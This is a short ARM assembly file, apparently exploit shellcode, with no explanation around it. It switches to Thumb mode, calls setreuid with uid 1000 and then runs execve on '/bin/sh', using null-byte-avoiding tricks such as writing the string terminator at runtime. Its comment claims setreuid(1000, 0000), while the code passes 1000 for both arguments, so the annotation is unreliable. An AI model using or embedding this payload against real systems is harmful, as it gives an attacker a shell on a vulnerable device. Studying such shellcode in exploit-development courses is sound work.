.section .text
.global _start

_start:
    .code 32

    // Switching to THUMB mode
    add r3, pc, #1
    bx r3

    .code 16

    // setreuid(1000, 0000)
    mov r7, #0x46
    ldr r0, uid
    mov r1, r0
    swi #1

    // execve("/bin/sh", NULL, NULL)
    adr r0, binsh
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]
    mov r7, #11
    swi #1

    binsh:
    .ascii "/bin/shx"
    uid:
    .byte 0xe8, 0x03 // 1000
